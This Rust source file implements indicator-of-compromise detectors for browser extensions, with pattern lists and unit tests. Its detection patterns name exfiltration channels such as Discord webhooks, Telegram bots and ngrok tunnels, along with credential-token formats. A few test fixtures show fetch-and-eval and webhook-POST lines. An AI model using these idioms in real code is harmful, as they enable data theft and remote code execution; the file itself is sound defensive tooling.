use super::models::{IOCFinding, IocCategory, IocSeverity};
use regex::Regex;
use std::sync::OnceLock;

/// Returns (line, column) for a byte offset inside `text`.
fn find_line_col(text: &str, byte_offset: usize) -> (usize, usize) {
    let safe_offset = byte_offset.min(text.len());
    let prefix = &text[..safe_offset];
    let line = prefix.bytes().filter(|&b| b == b'\n').count() + 1;
    let col = prefix
        .rfind('\n')
        .map(|p| safe_offset - p - 1)
        .unwrap_or(safe_offset);
    (line, col)
}

/// Core trait implemented by every IOC detector.
pub trait IocDetector: Send + Sync {
    fn category(&self) -> IocCategory;
    /// Scan raw source text and return all findings.
    fn scan(&self, text: &str, filename: &str) -> Vec<IOCFinding>;
}

// ════════════════════════════════════════════════════════════════════════════
// 1. Network IOC Detector
// ════════════════════════════════════════════════════════════════════════════

pub struct NetworkIocDetector;

impl NetworkIocDetector {
    /// (pattern_substring, title, description, severity)
    const PATTERNS: &'static [(&'static str, &'static str, &'static str, IocSeverity)] = &[
        (
            "discord.com/api/webhooks",
            "Discord Webhook",
            "Extension communicates with a Discord webhook — a common C2 channel for data exfiltration",
            IocSeverity::Critical,
        ),
        (
            "api.telegram.org/bot",
            "Telegram Bot API",
            "Extension communicates with Telegram Bot API — frequently used for covert C2 communication",
            IocSeverity::Critical,
        ),
        (
            "pastebin.com",
            "Pastebin Network Request",
            "Extension references Pastebin — often used to host and retrieve malicious payloads",
            IocSeverity::High,
        ),
        (
            "gist.githubusercontent.com",
            "GitHub Gist Raw Content",
            "Extension fetches raw content from GitHub Gist — a common vector for dynamic payload delivery",
            IocSeverity::High,
        ),
        (
            "raw.githubusercontent.com",
            "GitHub Raw Content",
            "Extension fetches raw GitHub content — may load remote scripts dynamically",
            IocSeverity::High,
        ),
        (
            "bit.ly",
            "URL Shortener (bit.ly)",
            "Extension uses a URL shortener to obscure the real destination",
            IocSeverity::Medium,
        ),
        (
            "tinyurl",
            "URL Shortener (TinyURL)",
            "Extension uses TinyURL to obscure network destinations",
            IocSeverity::Medium,
        ),
        (
            "ngrok",
            "Ngrok Tunnel",
            "Extension references ngrok — a tunneling service used to expose local servers and bypass firewalls",
            IocSeverity::High,
        ),
        (
            "trycloudflare",
            "Cloudflare Quick Tunnel",
            "Extension references trycloudflare tunneling, often used as a temporary C2 endpoint",
            IocSeverity::High,
        ),
        (
            "localhost.run",
            "localhost.run Tunnel",
            "Extension references localhost.run — a tunneling service used to expose internal servers",
            IocSeverity::High,
        ),
    ];
}

impl IocDetector for NetworkIocDetector {
    fn category(&self) -> IocCategory {
        IocCategory::Network
    }

    fn scan(&self, text: &str, filename: &str) -> Vec<IOCFinding> {
        let mut findings = Vec::new();
        for (line_idx, line_text) in text.lines().enumerate() {
            let line_lower = line_text.to_lowercase();
            for (pattern, title, description, severity) in Self::PATTERNS {
                if line_lower.contains(&pattern.to_lowercase()) {
                    let col = line_lower.find(&pattern.to_lowercase()).unwrap_or(0);
                    findings.push(IOCFinding {
                        id: format!("IOC-NET-{}", findings.len() + 1),
                        category: IocCategory::Network,
                        severity: severity.clone(),
                        title: title.to_string(),
                        description: description.to_string(),
                        matched_pattern: pattern.to_string(),
                        file: filename.to_string(),
                        line: line_idx + 1,
                        column: col,
                    });
                }
            }
        }
        findings
    }
}

// ════════════════════════════════════════════════════════════════════════════
// 2. Secret IOC Detector
// ════════════════════════════════════════════════════════════════════════════

pub struct SecretIocDetector;

static SECRET_REGEXES: OnceLock<Vec<(Regex, &'static str, &'static str, IocSeverity)>> =
    OnceLock::new();

impl SecretIocDetector {
    fn regexes() -> &'static Vec<(Regex, &'static str, &'static str, IocSeverity)> {
        SECRET_REGEXES.get_or_init(|| {
            vec![
                (
                    Regex::new(r"AIza[0-9A-Za-z\-_]{35}").unwrap(),
                    "Google API Key",
                    "Hardcoded Google API key detected — grants access to Google Cloud services",
                    IocSeverity::Critical,
                ),
                (
                    Regex::new(r"AKIA[0-9A-Z]{16}").unwrap(),
                    "AWS Access Key ID",
                    "Hardcoded AWS Access Key ID — grants access to AWS cloud resources",
                    IocSeverity::Critical,
                ),
                (
                    Regex::new(r"ghp_[A-Za-z0-9]{36}").unwrap(),
                    "GitHub Personal Access Token",
                    "Hardcoded GitHub PAT detected — allows repository and account access",
                    IocSeverity::Critical,
                ),
                (
                    Regex::new(r"gho_[A-Za-z0-9]{36}").unwrap(),
                    "GitHub OAuth Token",
                    "Hardcoded GitHub OAuth token detected",
                    IocSeverity::Critical,
                ),
                (
                    Regex::new(r"xoxb-[0-9]{11}-[0-9]{11}-[a-zA-Z0-9]{24}").unwrap(),
                    "Slack Bot Token",
                    "Hardcoded Slack bot token — can send and read messages in Slack workspaces",
                    IocSeverity::High,
                ),
                (
                    Regex::new(r"xoxp-[0-9]{11}-[0-9]{11}-[0-9]{11}-[a-zA-Z0-9]{32}").unwrap(),
                    "Slack User Token",
                    "Hardcoded Slack user token — full access to user's Slack account",
                    IocSeverity::Critical,
                ),
                (
                    Regex::new(r"sk_live_[0-9a-zA-Z]{24}").unwrap(),
                    "Stripe Live Secret Key",
                    "Hardcoded Stripe live key — grants full payment processing access",
                    IocSeverity::Critical,
                ),
                (
                    Regex::new(r"sk_test_[0-9a-zA-Z]{24}").unwrap(),
                    "Stripe Test Secret Key",
                    "Hardcoded Stripe test key detected",
                    IocSeverity::High,
                ),
                (
                    Regex::new(r"Bearer\s+[A-Za-z0-9\-_\.]{20,}").unwrap(),
                    "Hardcoded Bearer Token",
                    "A Bearer authentication token is hardcoded — may grant unauthorized API access",
                    IocSeverity::High,
                ),
                (
                    Regex::new(r"eyJhbGci[A-Za-z0-9_\-\.]{30,}").unwrap(),
                    "Hardcoded JWT",
                    "A JSON Web Token is hardcoded in the extension code",
                    IocSeverity::High,
                ),
                (
                    Regex::new(r"-----BEGIN PRIVATE KEY-----").unwrap(),
                    "Embedded Private Key",
                    "A PEM private key is embedded in the extension — critical security risk",
                    IocSeverity::Critical,
                ),
            ]
        })
    }
}

impl IocDetector for SecretIocDetector {
    fn category(&self) -> IocCategory {
        IocCategory::Secret
    }

    fn scan(&self, text: &str, filename: &str) -> Vec<IOCFinding> {
        let mut findings = Vec::new();
        for (regex, title, description, severity) in Self::regexes() {
            for m in regex.find_iter(text) {
                let (line, col) = find_line_col(text, m.start());
                findings.push(IOCFinding {
                    id: format!("IOC-SECRET-{}", findings.len() + 1),
                    category: IocCategory::Secret,
                    severity: severity.clone(),
                    title: title.to_string(),
                    description: description.to_string(),
                    matched_pattern: m.as_str().chars().take(40).collect::<String>()
                        + if m.as_str().len() > 40 { "…" } else { "" },
                    file: filename.to_string(),
                    line,
                    column: col,
                });
            }
        }
        findings
    }
}

// ════════════════════════════════════════════════════════════════════════════
// 3. Obfuscation IOC Detector
// ════════════════════════════════════════════════════════════════════════════

pub struct ObfuscationIocDetector;

impl ObfuscationIocDetector {
    const PATTERNS: &'static [(&'static str, &'static str, &'static str, IocSeverity)] = &[
        (
            "atob(",
            "Base64 Decode (atob)",
            "atob() decodes Base64 strings — a common technique to hide malicious payloads",
            IocSeverity::High,
        ),
        (
            "btoa(",
            "Base64 Encode (btoa)",
            "btoa() encodes data to Base64 — may be used to obscure data before exfiltration",
            IocSeverity::Medium,
        ),
        (
            "unescape(",
            "URL Decode (unescape)",
            "unescape() is deprecated and often used to decode obfuscated code strings",
            IocSeverity::High,
        ),
        (
            "fromCharCode(",
            "Character Code Decode (fromCharCode)",
            "String.fromCharCode() converts numeric codes to strings — classic obfuscation technique",
            IocSeverity::High,
        ),
        (
            "charCodeAt(",
            "Character Code Access (charCodeAt)",
            "charCodeAt() converts chars to numeric codes — often used in obfuscation routines",
            IocSeverity::Medium,
        ),
        (
            "Uint8Array(",
            "Raw Binary Array (Uint8Array)",
            "Uint8Array is used to manipulate raw binary data — can be used to embed and execute payloads",
            IocSeverity::Medium,
        ),
        (
            "TextDecoder(",
            "TextDecoder",
            "TextDecoder can decode binary-encoded payloads at runtime — possible deobfuscation step",
            IocSeverity::Medium,
        ),
    ];
}

impl IocDetector for ObfuscationIocDetector {
    fn category(&self) -> IocCategory {
        IocCategory::Obfuscation
    }

    fn scan(&self, text: &str, filename: &str) -> Vec<IOCFinding> {
        let mut findings = Vec::new();
        for (line_idx, line_text) in text.lines().enumerate() {
            for (pattern, title, description, severity) in Self::PATTERNS {
                if let Some(col) = line_text.find(pattern) {
                    findings.push(IOCFinding {
                        id: format!("IOC-OBFUSC-{}", findings.len() + 1),
                        category: IocCategory::Obfuscation,
                        severity: severity.clone(),
                        title: title.to_string(),
                        description: description.to_string(),
                        matched_pattern: pattern.to_string(),
                        file: filename.to_string(),
                        line: line_idx + 1,
                        column: col,
                    });
                }
            }
        }
        findings
    }
}

// ════════════════════════════════════════════════════════════════════════════
// 4. Crypto IOC Detector
// ════════════════════════════════════════════════════════════════════════════

pub struct CryptoIocDetector;

impl CryptoIocDetector {
    const PATTERNS: &'static [(&'static str, &'static str, &'static str, IocSeverity)] = &[
        (
            "CryptoJS",
            "CryptoJS Library",
            "CryptoJS usage detected — may be used to encrypt exfiltrated data or decrypt payloads",
            IocSeverity::High,
        ),
        (
            "AES.decrypt(",
            "AES Decryption",
            "AES decryption call detected — may decode an encrypted malicious payload at runtime",
            IocSeverity::High,
        ),
        (
            "AES.encrypt(",
            "AES Encryption",
            "AES encryption call detected — may be used to encrypt stolen data before exfiltration",
            IocSeverity::High,
        ),
        (
            "RC4(",
            "RC4 Cipher",
            "RC4 cipher detected — a weak cipher often used in malware for simple XOR-based obfuscation",
            IocSeverity::High,
        ),
        (
            " XOR ",
            "XOR Operation",
            "XOR operation detected — a primitive but effective technique to obfuscate data",
            IocSeverity::Medium,
        ),
        (
            "md5(",
            "MD5 Hash",
            "MD5 hashing detected — may be used for data fingerprinting or integrity checking in C2 protocols",
            IocSeverity::Low,
        ),
        (
            "sha1(",
            "SHA-1 Hash",
            "SHA-1 hashing detected — may be used for C2 authentication or data fingerprinting",
            IocSeverity::Low,
        ),
        (
            "sha256(",
            "SHA-256 Hash",
            "SHA-256 hashing detected — may be used for HMAC authentication in C2 communication",
            IocSeverity::Low,
        ),
    ];
}

impl IocDetector for CryptoIocDetector {
    fn category(&self) -> IocCategory {
        IocCategory::Crypto
    }

    fn scan(&self, text: &str, filename: &str) -> Vec<IOCFinding> {
        let mut findings = Vec::new();
        for (line_idx, line_text) in text.lines().enumerate() {
            for (pattern, title, description, severity) in Self::PATTERNS {
                if let Some(col) = line_text.find(pattern) {
                    findings.push(IOCFinding {
                        id: format!("IOC-CRYPTO-{}", findings.len() + 1),
                        category: IocCategory::Crypto,
                        severity: severity.clone(),
                        title: title.to_string(),
                        description: description.to_string(),
                        matched_pattern: pattern.to_string(),
                        file: filename.to_string(),
                        line: line_idx + 1,
                        column: col,
                    });
                }
            }
        }
        findings
    }
}

// ════════════════════════════════════════════════════════════════════════════
// 5. WebAssembly IOC Detector
// ════════════════════════════════════════════════════════════════════════════

pub struct WebAssemblyIocDetector;

impl WebAssemblyIocDetector {
    const PATTERNS: &'static [(&'static str, &'static str, &'static str, IocSeverity)] = &[
        (
            "WebAssembly",
            "WebAssembly API",
            "WebAssembly usage detected — WASM modules can contain complex malicious logic that evades JS analysis",
            IocSeverity::High,
        ),
        (
            "instantiateStreaming(",
            "WebAssembly instantiateStreaming",
            "WASM instantiateStreaming downloads and executes a binary module — potential for dynamic payload",
            IocSeverity::High,
        ),
        (
            "compileStreaming(",
            "WebAssembly compileStreaming",
            "WASM compileStreaming downloads a binary module — may contain hidden malicious logic",
            IocSeverity::High,
        ),
    ];
}

impl IocDetector for WebAssemblyIocDetector {
    fn category(&self) -> IocCategory {
        IocCategory::WebAssembly
    }

    fn scan(&self, text: &str, filename: &str) -> Vec<IOCFinding> {
        let mut findings = Vec::new();
        for (line_idx, line_text) in text.lines().enumerate() {
            for (pattern, title, description, severity) in Self::PATTERNS {
                if let Some(col) = line_text.find(pattern) {
                    findings.push(IOCFinding {
                        id: format!("IOC-WASM-{}", findings.len() + 1),
                        category: IocCategory::WebAssembly,
                        severity: severity.clone(),
                        title: title.to_string(),
                        description: description.to_string(),
                        matched_pattern: pattern.to_string(),
                        file: filename.to_string(),
                        line: line_idx + 1,
                        column: col,
                    });
                }
            }
        }
        findings
    }
}

// ════════════════════════════════════════════════════════════════════════════
// 6. Encoded Payload IOC Detector
// ════════════════════════════════════════════════════════════════════════════

pub struct EncodedPayloadIocDetector;

static PAYLOAD_REGEXES: OnceLock<Vec<(Regex, &'static str, &'static str, IocSeverity)>> =
    OnceLock::new();

impl EncodedPayloadIocDetector {
    /// Minimum length thresholds for encoded strings to reduce false positives.
    const BASE64_MIN_LEN: usize = 80;
    const HEX_MIN_LEN: usize = 64;

    fn regexes() -> &'static Vec<(Regex, &'static str, &'static str, IocSeverity)> {
        PAYLOAD_REGEXES.get_or_init(|| {
            vec![
                // Long Base64 string (80+ chars of valid base64 chars, possibly inside quotes)
                (
                    Regex::new(r#"['"`]([A-Za-z0-9+/]{80,}={0,2})['"`]"#).unwrap(),
                    "Long Base64 Encoded String",
                    "A long Base64-encoded string was detected — may contain an embedded payload",
                    IocSeverity::High,
                ),
                // Long hex string (64+ hex chars inside quotes)
                (
                    Regex::new(r#"['"`]([0-9a-fA-F]{64,})['"`]"#).unwrap(),
                    "Long Hex Encoded String",
                    "A long hexadecimal-encoded string was detected — may represent encoded shellcode or payload",
                    IocSeverity::High,
                ),
                // GZIP magic bytes as hex literal (1f8b)
                (
                    Regex::new(r"(?i)1f8b0[0-9a-f]{2}").unwrap(),
                    "Embedded GZIP Signature",
                    "GZIP magic bytes (1f8b) detected — an embedded compressed payload may be present",
                    IocSeverity::Critical,
                ),
                // ZIP magic bytes as literal string PK or hex (504b)
                (
                    Regex::new(r"(?i)504b0304").unwrap(),
                    "Embedded ZIP Signature",
                    "ZIP magic bytes (PK\\x03\\x04) detected — an embedded archive may be present",
                    IocSeverity::Critical,
                ),
            ]
        })
    }
}

impl IocDetector for EncodedPayloadIocDetector {
    fn category(&self) -> IocCategory {
        IocCategory::EncodedPayload
    }

    fn scan(&self, text: &str, filename: &str) -> Vec<IOCFinding> {
        let mut findings = Vec::new();
        for (regex, title, description, severity) in Self::regexes() {
            for m in regex.find_iter(text) {
                // For Base64 / Hex patterns check minimum length of the captured content
                let matched = m.as_str();
                // Quick length gate: skip short strings to cut false positives
                let inner = matched.trim_matches(|c| c == '\'' || c == '"' || c == '`');
                if (title.contains("Base64") && inner.len() < Self::BASE64_MIN_LEN)
                    || (title.contains("Hex") && inner.len() < Self::HEX_MIN_LEN)
                {
                    continue;
                }

                let (line, col) = find_line_col(text, m.start());
                let preview: String = matched.chars().take(50).collect();
                findings.push(IOCFinding {
                    id: format!("IOC-PAYLOAD-{}", findings.len() + 1),
                    category: IocCategory::EncodedPayload,
                    severity: severity.clone(),
                    title: title.to_string(),
                    description: description.to_string(),
                    matched_pattern: preview + if matched.len() > 50 { "…" } else { "" },
                    file: filename.to_string(),
                    line,
                    column: col,
                });
            }
        }
        findings
    }
}

// ════════════════════════════════════════════════════════════════════════════
// Tests
// ════════════════════════════════════════════════════════════════════════════

#[cfg(test)]
mod tests {
    use super::*;

    // ── Network ──────────────────────────────────────────────────────────────

    #[test]
    fn test_network_discord_webhook_critical() {
        let det = NetworkIocDetector;
        let src = r#"fetch("https://discord.com/api/webhooks/123/abc", { method: "POST" });"#;
        let findings = det.scan(src, "bg.js");
        assert!(!findings.is_empty());
        assert_eq!(findings[0].severity, IocSeverity::Critical);
        assert_eq!(findings[0].category, IocCategory::Network);
        assert!(findings[0].title.contains("Discord"));
    }

    #[test]
    fn test_network_telegram_bot_critical() {
        let det = NetworkIocDetector;
        let src = r#"const url = "https://api.telegram.org/bot123:TOKEN/sendMessage";"#;
        let findings = det.scan(src, "inject.js");
        assert!(!findings.is_empty());
        assert_eq!(findings[0].severity, IocSeverity::Critical);
    }

    #[test]
    fn test_network_pastebin_high() {
        let det = NetworkIocDetector;
        let src = r#"fetch("https://pastebin.com/raw/abc123").then(r => eval(r.text()));"#;
        let findings = det.scan(src, "loader.js");
        assert!(!findings.is_empty());
        assert_eq!(findings[0].severity, IocSeverity::High);
    }

    #[test]
    fn test_network_raw_github_high() {
        let det = NetworkIocDetector;
        let src =
            r#"const script = "https://raw.githubusercontent.com/user/repo/main/payload.js";"#;
        let findings = det.scan(src, "init.js");
        assert!(!findings.is_empty());
        assert_eq!(findings[0].severity, IocSeverity::High);
    }

    #[test]
    fn test_network_ngrok_high() {
        let det = NetworkIocDetector;
        let src = r#"const endpoint = "https://abc123.ngrok.io/collect";"#;
        let findings = det.scan(src, "data.js");
        assert!(!findings.is_empty());
        assert_eq!(findings[0].severity, IocSeverity::High);
    }

    #[test]
    fn test_network_bitly_medium() {
        let det = NetworkIocDetector;
        let src = r#"window.open("https://bit.ly/3xAbCdE");"#;
        let findings = det.scan(src, "popup.js");
        assert!(!findings.is_empty());
        assert_eq!(findings[0].severity, IocSeverity::Medium);
    }

    #[test]
    fn test_network_clean_code_no_findings() {
        let det = NetworkIocDetector;
        let src = r#"fetch("https://api.example.com/data").then(r => r.json());"#;
        let findings = det.scan(src, "app.js");
        assert!(findings.is_empty());
    }

    // ── Secret ───────────────────────────────────────────────────────────────

    #[test]
    fn test_secret_google_api_key_critical() {
        let det = SecretIocDetector;
        let src = r#"const key = "AIzaSyD-9tSrke72I6e0IV6zL73XXXXXXXXXXXX";"#;
        let findings = det.scan(src, "config.js");
        assert!(!findings.is_empty());
        assert_eq!(findings[0].severity, IocSeverity::Critical);
        assert!(findings[0].title.contains("Google"));
    }

    #[test]
    fn test_secret_aws_key_critical() {
        let det = SecretIocDetector;
        let src = r#"const awsKey = "AKIAIOSFODNN7EXAMPLE";"#;
        let findings = det.scan(src, "aws.js");
        assert!(!findings.is_empty());
        assert_eq!(findings[0].severity, IocSeverity::Critical);
        assert!(findings[0].title.contains("AWS"));
    }

    #[test]
    fn test_secret_github_pat_critical() {
        let det = SecretIocDetector;
        let src = r#"const token = "ghp_aBcDeFgHiJkLmNoPqRsTuVwXyZ0123456789";"#;
        let findings = det.scan(src, "auth.js");
        assert!(!findings.is_empty());
        assert_eq!(findings[0].severity, IocSeverity::Critical);
    }

    #[test]
    fn test_secret_bearer_token_high() {
        let det = SecretIocDetector;
        let src = r#"headers["Authorization"] = "Bearer eyABCDEFGHIJKLMNOPQRSTUVWXYZ";"#;
        let findings = det.scan(src, "net.js");
        assert!(!findings.is_empty());
        assert_eq!(findings[0].severity, IocSeverity::High);
    }

    #[test]
    fn test_secret_private_key_critical() {
        let det = SecretIocDetector;
        let src = "const pem = `-----BEGIN PRIVATE KEY-----\nMIIEvAIBADANBgk=\n-----END PRIVATE KEY-----`;";
        let findings = det.scan(src, "sign.js");
        assert!(!findings.is_empty());
        assert_eq!(findings[0].severity, IocSeverity::Critical);
    }

    #[test]
    fn test_secret_jwt_high() {
        let det = SecretIocDetector;
        let src = r#"const jwt = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ";"#;
        let findings = det.scan(src, "token.js");
        assert!(!findings.is_empty());
        assert_eq!(findings[0].severity, IocSeverity::High);
    }

    // ── Obfuscation ──────────────────────────────────────────────────────────

    #[test]
    fn test_obfuscation_atob_high() {
        let det = ObfuscationIocDetector;
        let src = r#"const code = atob("aGVsbG8gd29ybGQ="); eval(code);"#;
        let findings = det.scan(src, "loader.js");
        assert!(findings.iter().any(|f| f.title.contains("atob")));
        assert!(findings.iter().any(|f| f.severity == IocSeverity::High));
    }

    #[test]
    fn test_obfuscation_btoa_medium() {
        let det = ObfuscationIocDetector;
        let src = r#"const enc = btoa(JSON.stringify(data));"#;
        let findings = det.scan(src, "exfil.js");
        assert!(findings.iter().any(|f| f.severity == IocSeverity::Medium));
    }

    #[test]
    fn test_obfuscation_from_char_code_high() {
        let det = ObfuscationIocDetector;
        let src = r#"eval(String.fromCharCode(97,108,101,114,116,40,49,41));"#;
        let findings = det.scan(src, "obf.js");
        assert!(findings.iter().any(|f| f.title.contains("fromCharCode")));
    }

    #[test]
    fn test_obfuscation_text_decoder_medium() {
        let det = ObfuscationIocDetector;
        let src = r#"new TextDecoder("utf-8").decode(payload);"#;
        let findings = det.scan(src, "decode.js");
        assert!(!findings.is_empty());
        assert_eq!(findings[0].severity, IocSeverity::Medium);
    }

    // ── Crypto ───────────────────────────────────────────────────────────────

    #[test]
    fn test_crypto_cryptojs_high() {
        let det = CryptoIocDetector;
        let src = r#"var bytes = CryptoJS.AES.decrypt(data, key);"#;
        let findings = det.scan(src, "enc.js");
        assert!(findings.iter().any(|f| f.title.contains("CryptoJS")));
    }

    #[test]
    fn test_crypto_aes_decrypt_high() {
        let det = CryptoIocDetector;
        let src = r#"const plain = AES.decrypt(ciphertext, passphrase);"#;
        let findings = det.scan(src, "payload.js");
        assert!(findings.iter().any(|f| f.severity == IocSeverity::High));
    }

    #[test]
    fn test_crypto_md5_low() {
        let det = CryptoIocDetector;
        let src = r#"const hash = md5(username + password);"#;
        let findings = det.scan(src, "hash.js");
        assert!(findings.iter().any(|f| f.severity == IocSeverity::Low));
    }

    // ── WebAssembly ──────────────────────────────────────────────────────────

    #[test]
    fn test_wasm_webassembly_high() {
        let det = WebAssemblyIocDetector;
        let src = r#"WebAssembly.instantiateStreaming(fetch("/module.wasm"), imports);"#;
        let findings = det.scan(src, "wasm.js");
        // Should fire for both "WebAssembly" and "instantiateStreaming"
        assert!(findings.len() >= 2);
        assert!(findings.iter().all(|f| f.severity == IocSeverity::High));
    }

    #[test]
    fn test_wasm_compile_streaming_high() {
        let det = WebAssemblyIocDetector;
        let src = r#"const mod = await WebAssembly.compileStreaming(response);"#;
        let findings = det.scan(src, "mod.js");
        assert!(findings
            .iter()
            .any(|f| f.title.contains("compileStreaming")));
    }

    // ── Encoded Payload ──────────────────────────────────────────────────────

    #[test]
    fn test_encoded_long_base64_high() {
        let det = EncodedPayloadIocDetector;
        // 96-char base64 string
        let b64 = "A".repeat(96);
        let src = format!(r#"const payload = "{}";"#, b64);
        let findings = det.scan(&src, "payload.js");
        assert!(!findings.is_empty(), "Should detect long base64");
        assert_eq!(findings[0].severity, IocSeverity::High);
    }

    #[test]
    fn test_encoded_short_base64_not_flagged() {
        let det = EncodedPayloadIocDetector;
        // Short base64 (normal thing like a uuid)
        let src = r#"const id = "aGVsbG8=";"#;
        let findings = det.scan(src, "app.js");
        assert!(findings.is_empty(), "Short base64 should not be flagged");
    }

    #[test]
    fn test_encoded_long_hex_high() {
        let det = EncodedPayloadIocDetector;
        let hex = "0123456789abcdef".repeat(4); // 64 chars
        let src = format!(r#"const raw = "{}";"#, hex);
        let findings = det.scan(&src, "hex.js");
        assert!(!findings.is_empty(), "Should detect long hex string");
    }

    #[test]
    fn test_encoded_gzip_signature_critical() {
        let det = EncodedPayloadIocDetector;
        // GZIP magic: 1f8b 0800
        let src = r#"const data = "1f8b0800abcdef";"#;
        let findings = det.scan(src, "gz.js");
        assert!(!findings.is_empty());
        assert_eq!(findings[0].severity, IocSeverity::Critical);
    }

    #[test]
    fn test_encoded_zip_signature_critical() {
        let det = EncodedPayloadIocDetector;
        let src = r#"const archive = "504b030412345678";"#;
        let findings = det.scan(src, "zip.js");
        assert!(!findings.is_empty());
        assert_eq!(findings[0].severity, IocSeverity::Critical);
    }
}
